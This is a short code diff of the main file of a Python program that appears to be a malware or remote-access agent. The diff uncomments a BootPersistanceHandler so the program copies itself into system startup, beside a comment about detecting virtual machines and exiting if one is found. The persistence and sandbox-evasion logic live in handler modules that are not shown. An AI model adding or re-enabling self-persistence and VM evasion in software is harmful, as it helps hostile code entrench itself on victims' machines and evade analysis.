@@ -2,7 +2,7 @@
 
 import requests
 
-#from Handlers.BootPersistanceHandler import BootPersistanceHandler
+from Handlers.BootPersistanceHandler import BootPersistanceHandler
 from Handlers.TaskManagmentHandler import TaskManagmentHandler
 
 global configurations
@@ -44,8 +44,8 @@ def main():
     # Check if we run in Virtual Machine - Kill if yes
 
     # Check if agents exists on device, if not - immediately copy itself to system boot/run
-    #bootHandler = BootPersistanceHandler()
-    #bootHandler.addSelfToSystemToBoot() # Ignore if we already exists
+    bootHandler = BootPersistanceHandler()
+    bootHandler.addSelfToSystemToBoot() # Ignore if we already exists
 
     didLoadConfSuccfully = loadConfigurations()
     if didLoadConfSuccfully:
@@ -54,7 +54,6 @@ def main():
 if __name__ == "__main__":
     print("[i] - Information")
     print("[e] - Error")
-    print("[l] - Logging")
-    print("")
+    print("[l] - Logging\n")
 
     main()
